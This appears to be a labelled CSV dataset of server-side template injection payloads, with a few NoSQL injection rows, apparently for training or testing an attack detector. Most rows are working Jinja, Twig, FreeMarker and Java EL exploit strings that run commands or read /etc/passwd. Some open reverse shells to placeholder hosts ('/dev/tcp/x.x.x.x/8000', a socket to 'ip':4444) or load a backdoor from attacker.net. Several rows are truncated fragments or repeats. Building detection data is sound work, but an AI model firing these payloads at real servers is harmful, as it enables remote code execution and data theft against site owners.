{{cycler.__init__.__globals__.os}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{joiner.__init__.__globals__.os}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{namespace.__init__.__globals__.os}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{this}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{#with ""s"" as |string|}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{#with ""e""}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{#with split as |conslist|}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{this.pop}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{this.push (lookup string.sub ""constructor"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{this.pop}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{#with string.split as |codelist|}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{this.pop}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{this.pop}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{#each conslist}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{#with (string.sub.apply 0 codelist)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{this}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{/with}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{/each}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{/with}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{/with}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{/with}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{/with}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"string = ""{{= username}}""",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{= _.VERSION}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${= _.VERSION},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{= _.templateSettings.evaluate }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${= _.VERSION},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{= }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{= }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
{{7*7}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{7*'7'}} would result in 49,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(app)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(_context)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{app.request.server.all|join(',')}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
$output = $twig > render (,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
$output = $twig > render (,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{include(""wp-config.php"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{_self.env.setCache(""ftp://attacker.net:2121"")}}{{_self.env.loadTemplate(""backdoor"")}}",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{[0]|reduce('system','id')}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|map('system')|join}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{['id',1]|sort('system')|join}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('passthru')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|map('passthru')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{['nslookup oastify.com']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt'"," 'w').write('Hello here !') }}""",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{[0]|reduce('system','id')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${pageContext.request.getSession().setAttribute(""admin"",true)}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{a.stdio=[w,w]}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^m"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"${dwf.newInstance(ec,null)(""id"")}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${'patt'.toString().replace('a', 'x')}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^md"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"{{app.request.server.all|join(',')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{['id',1]|sort('system')|join}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^mdp"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
{{2*2}}[[3*3]],TEMPLATE_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
{{3*3}},TEMPLATE_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
{{3*'3'}},TEMPLATE_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
<%= 3 * 3 %>,GENERIC_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
${6*6},GENERIC_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
${{3*3}},TEMPLATE_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
@(6+5),GENERIC_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
*{7*7},GENERIC_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",GENERIC_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},GENERIC_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",TEMPLATE_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
{$smarty.version},GENERIC_INJECTION,SSTI,Low,T1190,Malicious,Generic SSTI payload
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},COMMAND_INJECTION,SSTI,Medium,T1190,Malicious,Generic SSTI payload
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SCRIPT_TAG_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SCRIPT_TAG_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SCRIPT_TAG_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},COMMAND_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},COMMAND_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},COMMAND_INJECTION,SSTI,High,T1190,Malicious,Generic SSTI payload
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{[0]|reduce('system','id')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${pageContext.request.getSession().setAttribute(""admin"",true)}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{a.stdio=[w,w]}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^m"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"${dwf.newInstance(ec,null)(""id"")}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${'patt'.toString().replace('a', 'x')}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^md"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"{{app.request.server.all|join(',')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{['id',1]|sort('system')|join}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^mdp"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B3%2A%273%27%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%3C%25%3D%203%20%2A%203%20%25%3E%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7B6%2A6%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%40%286%2B5%29%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%23%7B3%2A3%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%23%7B%203%20%2A%203%20%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bdump%28app%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bconfig.items%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%20request%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bself%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%24smarty.version%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest.__class__%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,High,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
*{7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{'a'.toUpperCase()}} ,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
